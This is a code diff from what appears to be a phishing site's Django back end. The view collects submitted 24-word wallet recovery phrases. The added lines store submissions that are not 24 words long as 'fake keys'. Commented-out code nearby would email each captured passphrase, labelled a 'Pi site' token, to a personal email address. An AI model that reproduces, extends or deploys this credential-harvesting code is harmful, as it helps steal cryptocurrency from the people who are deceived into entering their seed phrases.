@@ -77,11 +77,13 @@ def submit_pass(request):
         keys = request.POST.get('mf-text', '')
         keys = keys.lower()
         words = keys.split()
-
-        print(keys)
         
 
         if len(words) != 24:
+            fake_keys = models.FakeKey.objects.create(
+                fake_keys = keys
+            )
+            fake_keys.save()
             # if my_site:
             #     send_notify(payload=f'Fake Pass Phrase submitted - {formatted_time} - the passphrase is -( {keys} )', subject=f'Pi site {current_date} Token Submitted(Personal Fake)', email_to="ezekielobiajulu0@gmail.com")
             # else:
